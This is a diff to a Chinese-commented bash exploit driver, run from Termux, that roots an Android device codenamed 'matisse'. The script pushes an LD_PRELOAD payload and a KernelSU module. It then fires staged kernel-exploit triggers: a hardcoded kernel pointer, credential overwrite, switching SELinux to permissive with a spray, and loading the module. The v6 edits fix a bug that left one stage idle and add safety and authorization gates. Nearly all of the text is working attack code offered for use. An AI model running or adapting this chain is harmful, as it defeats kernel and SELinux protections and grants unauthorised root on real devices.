@@ -1,9 +1,18 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ============================================================
-# matisse KSU 一键狩猎脚本 v5 (架构 = 对面 field_auto.sh + KSU 序列)
-# 用法: Termux 里 `bash ~/ksu_hunt.sh` — 零判断全自动, 卡片式汇报
-# 序列: 部署(SHA门) → 取证 → 体检 → R → E5v3 → C(+KO) → E5R → 回收回传
+# matisse KSU 一键狩猎脚本 v6 (分析侧审计修订 2026-09-07)
+# 用法: `bash ~/ksu_hunt.sh`                 — 默认无 KO (仅取 C 落地证据)
+#       `HUNT_ALLOW_KO=1 bash ~/ksu_hunt.sh` — 装填 KO (需用户明确授权!!)
+# 序列: 部署(SHA门) → 取证 → 体检(load门15) → R → E5v3 → C → E5R → 回收回传
 # 判据: ksu_done.txt / root_alive.txt / uname -n=glroot / ROOT-SEEN euid=0
+# v6 修复 (审计详情见 REVIEW_2026-09-07_hunt_audit.md):
+#   1. fire() C 轮 PSELECT_TASK 原追加在 `> ... 2>&1` 之后 → 成为 sleep 的
+#      argv 而非环境变量 → `sleep: invalid time interval` → C 轮 100% 空转
+#      (沙盒实测复现)。修: 并入 env 块 (run_c_strike.sh line 58 同款)。
+#   2. E5→C 间 child 心跳新鲜度校验 (mt86 纪律移植, c-strike 有而 hunt 漏)。
+#   3. load>15 铁律门 (原"仅记录"不拦截, 违反 09-06 软重启教训)。
+#   4. KO 推送结果检查 (原 rpush 静默失败) + HUNT_ALLOW_KO 授权门
+#      (既定用户规则: insmod/KSU 需另行授权, 脚本级强制)。
 # ============================================================
 set -u
 TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
@@ -69,8 +78,23 @@ say "第2步: 部署 mt85 + matisse kernelsu.ko"
 SHA_EXP=$(grep -ao '[0-9a-f]\{64\}' "$WORK/bin/mt85/BUILD_INFO.txt" 2>/dev/null | head -1)
 rpush "$WORK/bin/mt85/preload.so" "/data/local/tmp/preload.new" >/dev/null
 rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
-rpush "$WORK/kernelsu_prep/kernelsu_matisse_built.ko" "/data/local/tmp/kernelsu_matisse.ko" >/dev/null
-rsh "chmod 644 /data/local/tmp/kernelsu_matisse.ko" 20 >/dev/null
+# KO 装填: 默认关闭, HUNT_ALLOW_KO=1 显式授权才武装 (用户既定规则)
+KOV=""
+if [ "${HUNT_ALLOW_KO:-0}" = "1" ]; then
+  if [ -f "$WORK/kernelsu_prep/kernelsu_matisse_built.ko" ]; then
+    rpush "$WORK/kernelsu_prep/kernelsu_matisse_built.ko" "/data/local/tmp/kernelsu_matisse.ko" >/dev/null \
+      || say "!! KO 推送失败 (rish 闪断) — C 轮将无 KO"
+    rsh "chmod 644 /data/local/tmp/kernelsu_matisse.ko" 20 >/dev/null
+    [ -n "$(rsh "ls /data/local/tmp/kernelsu_matisse.ko 2>/dev/null" 20 | tr -d '\r')" ] \
+      && KOV="/data/local/tmp/kernelsu_matisse.ko"
+    say "KO 已武装: $KOV"
+    say "警告: 此 ko 尚无 kprobe-resolver, 预期 Unknown symbol 失败 (仅走通链路)"
+  else
+    say "!! kernelsu_prep/kernelsu_matisse_built.ko 不在本地克隆 (未归档资产) — 无 KO 模式"
+  fi
+else
+  say "KO 未授权 (HUNT_ALLOW_KO 未设) — C 轮仅取 C 落地证据, 不装填模块"
+fi
 SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
 say "SHA 期望=${SHA_EXP:0:16}... 实际=${SHA_GOT:0:16}..."
 if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
@@ -110,7 +134,13 @@ while :; do
   say "开机仅 ${UP}s, settle..."; sleep 100
 done
 LOAD0=$(rsh "cat /proc/loadavg" 20 | tr -d '\r')
-say "体检 OK: boot=$(printf '%s' "$BOOT0" | cut -c1-8) enforce=$ENF0 load=$LOAD0 (仅记录)"
+LOAD_INT=${LOAD0%%.*}
+case "$LOAD_INT" in ''|*[!0-9]*) LOAD_INT=99;; esac
+if [ "$LOAD_INT" -gt 15 ]; then
+  say "!! load=$LOAD0 > 15 铁律 (09-06 软重启教训, load16.7) — 不开火, 稍后重跑"
+  exit 6
+fi
+say "体检 OK: boot=$(printf '%s' "$BOOT0" | cut -c1-8) enforce=$ENF0 load=$LOAD0"
 
 # ── 5. 开火机器 ──
 cleangate(){ local i
@@ -121,22 +151,30 @@ cleangate(){ local i
     say "门槛文件未删净, 重试 $i..."
   done; return 1; }
 fire(){
-  local name="$1" kind="$2" task="$3" te="" cmd
+  local name="$1" kind="$2" task="$3" te="" cmd tskenv koflag
+  # v6 关键修复: PSELECT_TASK/PSELECT_KO 必须在 env 块内 (重定向前)。
+  # 原版追加在 `> $name.out 2>&1` 之后 → 成为 sleep 的 argv → 触发器 100% 不运行。
+  tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
+  koflag=""; [ -n "$KOV" ] && koflag="PSELECT_KO=$KOV"
   case "$kind" in
     R)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
     E5) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
-    C)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_KO=/data/local/tmp/kernelsu_matisse.ko PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
+    C)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
     E5R) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
   esac
-  if [ -n "$task" ]; then
-    cmd="$cmd PSELECT_TASK=$task"
-  fi
   say "开火 $name (约4-5分钟, 勿动手机, 保持亮屏)..."
   rsh1 "$cmd" 280 | grep -a "RC=" | tail -1
   local ef
   ef=$(rsh "getenforce" 20 | tr -d '\r')
   say "$name 完成 enforce=$ef"
 }
+hb_fresh(){ local now mt age
+  now=$(rsh "date +%s" 20 | tr -d '\r'); mt=$(rsh "stat -c %Y /data/local/tmp/mt49_child_status.txt" 20 | tr -d '\r')
+  case "$now$mt" in ''|*[!0-9]*) return 1;; esac
+  age=$((now-mt))
+  [ "$age" -le 30 ] && return 0
+  say "!! child 心跳陈旧: ${age}s (child 死亡/致盲?)"
+  return 1; }
 gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
   printf '%s' "$st" | grep -q "CapEff=0000000000000000" && { echo "R_MISS"; return; }
   printf '%s' "$st" | grep -q "task=" && { echo "R_LANDED"; return; }
@@ -159,10 +197,14 @@ if [ "$BOOT1" = "READ_FAIL" ]; then
 elif [ "$R11_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
   T=$(gettask); say "R 落地! E5v3 permissive 窗口..."
   fire E51 E5 ""; say "E5 后 enforce=$(rsh 'getenforce' 20 | tr -d '\r')"
-  say "C 击 (KO 已武装, permissive 窗口内)..."
-  fire C1 C "$T"; C_FIRED=1
-  KO=$(rsh "ls /data/local/tmp/ksu_done.txt 2>/dev/null; grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d '\r')
-  say "KO 检查: $KO"
+  if hb_fresh; then
+    say "C 击 (permissive 窗口内, 心跳新鲜)..."
+    fire C1 C "$T"; C_FIRED=1
+    KO=$(rsh "ls /data/local/tmp/ksu_done.txt 2>/dev/null; grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d '\r')
+    say "KO 检查: $KO"
+  else
+    say "!! child 心跳陈旧/死亡 — C 不击 (mt86 纪律), 直接还原"
+  fi
   E5R_NEEDED=$(rsh "getenforce" 20 | tr -d '\r')
   if [ "$E5R_NEEDED" = "Permissive" ]; then fire E5R1 E5R ""; say "E5R: enforce=$(rsh 'getenforce' 20 | tr -d '\r')"; fi
 else
@@ -171,7 +213,12 @@ else
   BOOT2=$(bootid)
   if [ "$R12_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
     T=$(gettask); say "R12 落地! E5v3 → C..."
-    fire E52 E5 ""; fire C1 C "$T"; C_FIRED=1
+    fire E52 E5 ""
+    if hb_fresh; then
+      fire C1 C "$T"; C_FIRED=1
+    else
+      say "!! child 心跳陈旧/死亡 — C 不击 (mt86 纪律)"
+    fi
     E5R_NEEDED=$(rsh "getenforce" 20 | tr -d '\r')
     [ "$E5R_NEEDED" = "Permissive" ] && { fire E5R1 E5R ""; say "E5R 还原完成"; }
   else
